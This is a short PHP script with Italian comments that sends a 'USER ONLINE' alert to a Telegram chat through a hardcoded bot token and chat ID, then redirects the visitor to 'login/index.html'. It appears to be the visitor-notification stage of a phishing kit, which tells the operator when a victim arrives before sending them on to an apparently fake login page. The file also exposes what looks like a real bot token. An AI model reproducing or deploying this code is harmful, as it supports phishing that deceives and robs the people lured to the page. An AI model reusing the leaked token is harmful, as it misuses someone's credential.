<?php
// Token del tuo bot
$botApiToken = '6400179200:AAFLNC22j2zdSxCD83QB70N3zgHyG3AMgiA';
// Il tuo chat ID
$channelId = '8105246558';
$txt = "🤵USER ONLINE";

// Costruisci la query
$query = http_build_query([
    'chat_id' => $channelId,
    'text' => $txt,
]);

// URL per inviare il messaggio
$url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

// Inizializza cURL
$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => 'GET',
]);

// Esegui la richiesta e cattura la risposta
$response = curl_exec($curl);

// Controlla eventuali errori
if ($response === false) {
    // Gestisci l'errore di cURL
    echo 'cURL Error: ' . curl_error($curl);
} else {
    // Puoi anche decodificare la risposta JSON se necessario
    $responseData = json_decode($response, true);
    if ($responseData['ok']) {
        echo "Messaggio inviato con successo!";
    } else {
        echo "Errore nell'invio del messaggio: " . $responseData['description'];
    }
}

// Chiudi la connessione cURL
curl_close($curl);

// Reindirizza all'indirizzo principale (index.php)
header('Location: login/index.html');
exit;
?>
